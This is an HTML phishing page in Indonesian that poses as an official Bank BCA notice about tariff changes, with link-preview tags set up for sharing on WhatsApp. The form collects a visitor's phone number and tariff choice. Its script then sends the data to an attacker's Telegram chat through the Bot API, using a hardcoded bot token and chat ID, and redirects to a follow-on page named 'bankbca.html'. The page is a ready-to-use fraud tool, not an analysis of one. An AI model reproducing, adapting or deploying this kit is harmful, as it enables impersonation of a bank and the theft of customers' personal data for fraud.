<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank BCA</title>
     <!-- Open Graph Meta Tags untuk WhatsApp -->
    <meta property="og:title" content="Info Resmi Bank BCA">
    <meta property="og:description" content="PT Bank Central Asia Tbk.">
    <meta property="og:image" content="https://i.ibb.co.com/8YcLNsq/IMG-20241112-WA0009.jpg">
    <meta property="og:url" content="https://i.ibb.co.com/8YcLNsq/IMG-20241112-WA0009.jpg">
    <meta property="og:type" content="website">
    <!-- Optional: jika ingin menambahkan Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://www.example.com/path/to/your-image.jpg">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        
        .loader-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .loader {
            width: 100px;
            height: 100px;
            background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
            border: 1px solid #f3f3f3;
            border-top: 5px solid #4A90E2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .content {
            display: none;
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
            margin-top: -25px;
            overflow-y: hidden;
        }

        .fade-in {
            animation: fadeIn 1s ease-in;
        }

        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }

        .card {
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }

        .card:hover {
            transform: translateY(-5px);
        }
        
        .my-button {
          background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
          font-weight: bold;
          padding: 15px;
        }
        
.my-button:hover {
    background-color: #45a049; /* Warna saat hover */
}
.mb-0 {
  background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
  border-radius: 5px;
  text-align: center;
  font-size: 15px;
  padding: 10px;
}
.form-label {
  outline: none;
}
.content {
  background-color: #f0f8ff; /* Mengubah warna latar belakang menjadi biru muda */
  padding: 20px;
  border-radius: 8px; /* Menambahkan radius sudut */
}

.container {
  background-color: #f0f8ff; /* Mengubah warna latar belakang menjadi putih */
}
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loader-container" id="loaderContainer">
        <div class="loader"></div>
    </div>

    <!-- Main Content -->
    <div class="content" id="mainContent">
        <div class="container mt-5">
            <div class="card">
                <div class="card-header bg-primary text-white">
                    <h4 class="mb-0">Perubahan Tarif BANK BCA</h4>
                </div>
                <div class="card-body">
                    <form id="tarifForm">
                        <div class="mb-4">
                            <label for="phoneNumber" class="form-label">Nomor Handphone</label>
                            <div class="input-group">
                                <span class="input-group-text">+62</span>
                                <input type="tel" class="form-control" id="phoneNumber" placeholder="Masukkan nomor handphone" required pattern="[0-9]{10,12}">
                            </div>
                            <div class="form-text">Contoh: 81234567890</div>
                        </div>

                        <div class="mb-4">
                            <label class="form-label">Pilih Jenis Tarif</label>
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <div class="card h-100">
                                        <div class="card-body">
                                            <h5 class="card-title">Tarif Lama</h5>
                                            <p class="card-text">Tarif reguler sebelum perubahan</p>
                                            <div class="form-check">
                                                <input class="form-check-input" type="radio" name="tarifOption" id="tarifLama" value="lama" required>
                                                <label class="form-check-label" for="tarifLama">
                                                    Pilih Tarif Lama
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="card h-100">
                                        <div class="card-body">
                                            <h5 class="card-title">Tarif Baru</h5>
                                            <p class="card-text">Tarif terbaru dengan benefit lebih</p>
                                            <div class="form-check">
                                                <input class="form-check-input" type="radio" name="tarifOption" id="tarifBaru" value="baru" required>
                                                <label class="form-check-label" for="tarifBaru">
                                                    Pilih Tarif Baru
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                       <button type="submit" class="btn btn-primary w-100 my-button">Lanjutkan</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        
        <script>
        // Simulate loading
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('loaderContainer').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
                document.getElementById('mainContent').classList.add('fade-in');
            }, 2000); // Loading akan hilang setelah 2 detik
        });
        
        // Konfigurasi Telegram
        const TELEGRAM_BOT_TOKEN = '7716996968:AAFfmIxyUs0cBHp9E21cUeXtzwpZFcJSDWw';
        const TELEGRAM_CHAT_ID = '7225707577';
        
        // Fungsi untuk mengirim pesan ke Telegram
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                return await response.json();
            } catch (error) {
                console.error('Error:', error);
                throw error;
            }
        }

        // Fungsi untuk menampilkan loading
        function showLoading() {
            document.getElementById('loaderContainer').style.display = 'flex';
            document.getElementById('mainContent').style.display = 'none';
        }

        // Fungsi untuk menyembunyikan loading
        function hideLoading() {
            document.getElementById('loaderContainer').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        }

        // Initial loading
        window.addEventListener('load', function() {
            setTimeout(function() {
                hideLoading();
                document.getElementById('mainContent').classList.add('fade-in');
            }, 2000);
        });

        // Form submission
        document.getElementById('tarifForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phoneNumber').value;
            const selectedTarif = document.querySelector('input[name="tarifOption"]:checked');
            
            if (!phone.match(/^[0-9]{10,12}$/)) {
                alert('Mohon masukkan nomor handphone yang valid (10-12 digit)');
                return;
            }

            if (!selectedTarif) {
                alert('Mohon pilih jenis tarif');
                return;
            }

            try {
                showLoading();
                
                // Format pesan untuk Telegram
                const message = `
<b>Data Perubahan Tarif Baru</b>
-----------------------------
\ud83d\udcf1 Nomor: +62${phone}
\ud83d\udccb Tarif: ${selectedTarif.value}
\u23f0 Waktu: ${new Date().toLocaleString('id-ID')}
`;

                // Kirim ke Telegram
                await sendToTelegram(message);

                // Tunggu 2 detik sebelum redirect
                setTimeout(function() {
                    // Ganti URL_HALAMAN_BERIKUTNYA dengan URL halaman yang dituju
                    window.location.href = 'bankbca.html';
                }, 2000);

            } catch (error) {
                hideLoading();
                alert('Terjadi kesalahan saat mengirim data. Silakan coba lagi.');
                console.error('Error:', error);
            }
        });
        </script>
</body>
</html>
